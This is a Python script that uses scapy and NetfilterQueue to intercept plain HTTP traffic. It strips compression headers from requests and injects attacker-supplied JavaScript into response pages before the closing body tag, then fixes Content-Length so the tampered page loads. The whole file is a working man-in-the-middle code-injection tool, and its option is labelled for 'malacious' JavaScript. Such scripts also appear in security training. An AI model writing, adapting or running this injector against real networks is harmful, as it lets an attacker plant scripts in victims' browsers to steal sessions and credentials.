import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re
from optparse import OptionParser


def taking_args():
    parser = OptionParser()
    parser.add_option('-m', '--malacious-js', dest='malaciousJs', help='Enter Malacious javascript code (eg: -m "<script>alert(1);</script>"')
    (options, arguments) = parser.parse_args()
    if(options.malaciousJs):
        return parser.parse_args()
    else:
        print('[-] You forgot to provide valid args\nUse -h or --help for help')
        exit()
(options, args) = taking_args()
mal_js = options.malaciousJs
def changing_load(packet, ModifiedLoad):
    packet[scapy.Raw].load = ModifiedLoad
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def code_inj(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            load = load.replace('</body>', mal_js+'</body>')
            code_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
            if(code_length_search):
                code_length = code_length_search.group(1)
                modified_length = int(code_length) + len(mal_js)
                load = load.replace(code_length, str(modified_length))

        if load != scapy_packet[scapy.Raw].load:        
            modified_packet = changing_load(scapy_packet, load)
            packet.set_payload(bytes(modified_packet))
            print(modified_packet.show())

    packet.accept()



            

nfqueue = NetfilterQueue()
print('Waititng for response....')
nfqueue.bind(0, code_inj)
nfqueue.run()
